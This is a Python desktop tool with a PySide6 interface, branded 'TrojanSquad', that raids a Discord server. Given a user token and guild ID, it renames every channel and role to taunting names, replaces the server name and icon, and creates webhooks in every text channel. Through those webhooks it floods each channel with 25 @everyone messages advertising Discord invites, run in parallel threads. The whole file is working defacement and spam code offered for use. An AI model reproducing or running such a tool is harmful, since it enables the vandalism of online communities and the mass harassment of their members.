import sys
import os
import requests
import time
import threading
import base64
from PySide6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                             QHBoxLayout, QPushButton, QTextEdit, QDialog, QLineEdit, 
                             QLabel, QGridLayout)
from PySide6.QtCore import Qt
from PySide6.QtGui import QFont, QPalette, QColor, QIcon, QPixmap

class ConfigDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Configuration")
        self.setFixedSize(400, 350)
        self.setup_ui()
        
    def setup_ui(self):
        layout = QGridLayout(self)
        layout.setSpacing(10)
        layout.setContentsMargins(15, 15, 15, 15)
        
        self.inputs = {}
        fields = [
            ("Token:", ""),
            ("Guild ID:", ""),
            ("Channel/Role Name:", "🧨OwnedByTrojanSquad"),
            ("Server Name:", "FvckedByTheTrojanSquad"),
            ("Icon URL:", "https://images-ext-1.discordapp.net/external/SJkfeoQ9jrsVRXlTKNO6c15emC_EzTuxJ5BQQZ6g_3c/https/cdn.discordapp.com/icons/1279548699835629633/b72c4fb0528c67bc001ea4c1101f3d2f.png?format=webp&quality=lossless"),
            ("Message:", "✠ > [ @everyone ]\n https://discord.gg/yvFpX2j8WG\n https://discord.gg/PHCEcrThRA")
        ]
        
        for i, (label, default) in enumerate(fields):
            lbl = QLabel(label)
            lbl.setStyleSheet("color: #00ff00; font-weight: bold;")
            input_field = QLineEdit(default)
            input_field.setStyleSheet("background-color: #1a1a1a; color: #00ff00; border: 1px solid #00ff00; border-radius: 4px; padding: 4px;")
            layout.addWidget(lbl, i, 0)
            layout.addWidget(input_field, i, 1)
            self.inputs[label.strip(":")] = input_field
        
        save_btn = QPushButton("Save")
        save_btn.setStyleSheet("background-color: #00ff00; color: #000000; border-radius: 4px; padding: 6px; font-weight: bold;")
        save_btn.clicked.connect(self.accept)
        layout.addWidget(save_btn, len(fields), 0, 1, 2)
        
    def get_config(self):
        return {key: input_field.text() for key, input_field in self.inputs.items()}

class DiscordModMenu(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Trojan$quad 0n Top")
        self.setFixedSize(400, 500)  
        self.config = {
            "Token": "",
            "Guild ID": "",
            "Channel/Role Name": "🧨OwnedByTrojanSquad",
            "Server Name": "FvckedByTheTrojanSquad",
            "Icon URL": "https://images-ext-1.discordapp.net/external/SJkfeoQ9jrsVRXlTKNO6c15emC_EzTuxJ5BQQZ6g_3c/https/cdn.discordapp.com/icons/1279548699835629633/b72c4fb0528c67bc001ea4c1101f3d2f.png?format=webp&quality=lossless",
            "Message": "✠ > [ @everyone ]\n https://discord.gg/yvFpX2j8WG\n https://discord.gg/PHCEcrThRA"
        }
        self.headers = {"Content-Type": "application/json"}
        self.setup_ui()
        self.apply_styles()
        self.set_window_icon()

    def set_window_icon(self):
        icon_path = os.path.join(os.path.dirname(__file__), 'trojansquad.png')
        self.setWindowIcon(QIcon(icon_path))

    def apply_styles(self):
        palette = QPalette()
        palette.setColor(QPalette.Window, QColor(10, 10, 10))
        palette.setColor(QPalette.WindowText, QColor(0, 255, 0))
        palette.setColor(QPalette.Base, QColor(20, 20, 20))
        palette.setColor(QPalette.Text, QColor(0, 255, 0))
        palette.setColor(QPalette.Button, QColor(30, 30, 30))
        palette.setColor(QPalette.ButtonText, QColor(0, 255, 0))
        palette.setColor(QPalette.Highlight, QColor(0, 200, 0))
        self.setPalette(palette)

        self.setStyleSheet("""
            QMainWindow {
                background-color: #0a0a0a;
            }
            QPushButton {
                background-color: #1a1a1a;
                color: #00ff00;
                border: 1px solid #00ff00;
                border-radius: 6px;
                padding: 8px;
                font-size: 13px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #00ff00;
                color: #000000;
            }
            QTextEdit {
                background-color: #1a1a1a;
                color: #00ff00;
                border: 1px solid #00ff00;
                border-radius: 4px;
                font-size: 12px;
            }
            QLabel {
                color: #00ff00;
                font-size: 16px;
                font-weight: bold;
            }
        """)

    def setup_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        main_layout.setContentsMargins(15, 15, 15, 15)
        main_layout.setSpacing(10)

        header_image_path = os.path.join(os.path.dirname(__file__), 'trojansquad_2.png')
        header_image = QLabel(self)
        pixmap = QPixmap(header_image_path).scaled(370, 100, Qt.KeepAspectRatio, Qt.SmoothTransformation)  
        header_image.setPixmap(pixmap)
        header_image.setAlignment(Qt.AlignCenter)
        main_layout.addWidget(header_image)

        title = QLabel("TrojanNet - SelfBot")
        title.setFont(QFont("Courier", 16, QFont.Bold))
        title.setAlignment(Qt.AlignCenter)
        main_layout.addWidget(title)

        button_layout = QGridLayout()
        button_layout.setSpacing(8)
        buttons = [
            ("CONFIG", self.open_config),
            ("RENAME CHANNELS", self.renombrar_canales),
            ("RENAME ROLES", self.renombrar_roles),
            ("CHANGE SERVER", self.cambiar_nombre_e_icono),
            ("CREATE WEBHOOKS", self.crear_webhooks),
            ("SEND MESSAGES", self.enviar_mensajes)
        ]
        for i, (name, func) in enumerate(buttons):
            btn = QPushButton(name)
            btn.clicked.connect(func)
            button_layout.addWidget(btn, i // 2, i % 2)
        main_layout.addLayout(button_layout)

        self.log = QTextEdit()
        self.log.setReadOnly(True)
        self.log.setFixedHeight(150)
        main_layout.addWidget(self.log)

    def open_config(self):
        dialog = ConfigDialog(self)
        if dialog.exec():
            self.config = dialog.get_config()
            self.log_message("Configuration updated")

    def log_message(self, message):
        self.log.append(message)
        QApplication.processEvents()

    def renombrar_canales(self):
        self.headers["Authorization"] = self.config["Token"]
        self.log_message("Renombrando canales...")
        r = requests.get(f"https://discord.com/api/v10/guilds/{self.config['Guild ID']}/channels", headers=self.headers)
        if r.status_code != 200:
            self.log_message("Error al obtener canales")
            return
        canales = r.json()
        for canal in canales:
            if canal["type"] in [0, 2, 4]:
                canal_id = canal["id"]
                res = requests.patch(f"https://discord.com/api/v10/channels/{canal_id}", headers=self.headers, json={"name": self.config['Channel/Role Name']})
                self.log_message(f"Canal {canal['name']} renombrado" if res.status_code == 200 else f"Error al renombrar {canal['name']}")
                time.sleep(0.3)

    def renombrar_roles(self):
        self.headers["Authorization"] = self.config["Token"]
        self.log_message("Renombrando roles...")
        r = requests.get(f"https://discord.com/api/v10/guilds/{self.config['Guild ID']}/roles", headers=self.headers)
        if r.status_code != 200:
            self.log_message("Error al obtener roles")
            return
        roles = r.json()
        for rol in roles:
            if rol["name"] != "@everyone":
                rol_id = rol["id"]
                res = requests.patch(f"https://discord.com/api/v10/guilds/{self.config['Guild ID']}/roles/{rol_id}", headers=self.headers, json={"name": self.config['Channel/Role Name']})
                self.log_message(f"Rol {rol['name']} renombrado" if res.status_code == 200 else f"Error al renombrar rol {rol['name']}")
                time.sleep(0.3)

    def cambiar_nombre_e_icono(self):
        self.headers["Authorization"] = self.config["Token"]
        self.log_message("Cambiando nombre e icono del servidor...")
        try:
            image_response = requests.get(self.config['Icon URL'])
            if image_response.status_code == 200:
                encoded = base64.b64encode(image_response.content).decode('utf-8')
                ext = self.config['Icon URL'].split(".")[-1].split("?")[0]
                mime = f"image/{ext if ext != 'jpg' else 'jpeg'}"
                icono_data = f"data:{mime};base64,{encoded}"
                payload = {"name": self.config['Server Name'], "icon": icono_data}
                res = requests.patch(f"https://discord.com/api/v10/guilds/{self.config['Guild ID']}", headers=self.headers, json=payload)
                self.log_message("Nombre e icono cambiados" if res.status_code == 200 else f"Error al cambiar icono: {res.status_code}")
            else:
                self.log_message("Error al descargar imagen")
        except Exception as e:
            self.log_message(f"Error al cambiar icono: {e}")

    def crear_webhooks(self):
        self.headers["Authorization"] = self.config["Token"]
        self.log_message("Creando webhooks...")
        r = requests.get(f"https://discord.com/api/v10/guilds/{self.config['Guild ID']}/channels", headers=self.headers)
        if r.status_code != 200:
            self.log_message("Error al obtener canales")
            return
        canales = r.json()
        self.webhooks = []
        for canal in canales:
            if canal["type"] == 0:
                resp = requests.post(f"https://discord.com/api/v10/channels/{canal['id']}/webhooks", headers=self.headers, json={"name": "💣 TrojanSquad0nTop"})
                if resp.status_code == 200:
                    webhook = resp.json()
                    url = f"https://discord.com/api/webhooks/{webhook['id']}/{webhook['token']}"
                    self.webhooks.append((url, canal['name']))
                    self.log_message(f"Webhook creado en canal {canal['name']}")
                else:
                    self.log_message(f"No se pudo crear webhook en canal {canal['name']}")

    def enviar_mensajes(self):
        if not hasattr(self, 'webhooks') or not self.webhooks:
            self.log_message("Primero crea los webhooks")
            return
        self.headers["Authorization"] = self.config["Token"]
        self.log_message("Enviando mensajes por todas las webhooks...")
        
        def enviar_mensajes_sync(url, nombre_canal):
            for _ in range(25):
                r = requests.post(url, json={"content": self.config['Message']})
                self.log_message(f"Mensaje enviado en {nombre_canal}" if r.status_code in [200, 204] else f"Error al enviar en {nombre_canal}")
                time.sleep(0.3)

        threads = []
        for url, canal_nombre in self.webhooks:
            t = threading.Thread(target=enviar_mensajes_sync, args=(url, canal_nombre))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()
        self.log_message("Envío de mensajes finalizado")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = DiscordModMenu()
    window.show()
    sys.exit(app.exec())
